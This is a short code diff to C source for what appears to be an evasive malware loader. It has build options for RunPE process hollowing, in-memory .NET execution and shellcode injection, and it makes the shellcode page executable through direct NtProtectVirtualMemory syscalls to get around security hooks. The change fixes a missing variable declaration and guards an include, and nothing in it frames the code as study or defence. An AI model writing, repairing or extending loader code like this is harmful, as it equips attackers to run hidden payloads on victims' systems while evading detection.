@@ -8,7 +8,10 @@
 #ifdef RUN_PE
 #include "execution/runpe.h"
 #endif
+
+#ifdef RUN_DOTNET
 #include "execution/dotnet.h"
+#endif
 
 #ifdef VERBOSE
 #define DBG(...) printf(__VA_ARGS__ "\n")
@@ -130,6 +133,7 @@ Run()
 
 #ifdef INJECT_SHELLCODE
     // Make shellcode page executable
+    DWORD dwOld;
     PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
     ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), &pAllocMem, (SIZE_T*)&payloadLen, PAGE_EXECUTE_READWRITE, &dwOld); // hmmm.... :)
 
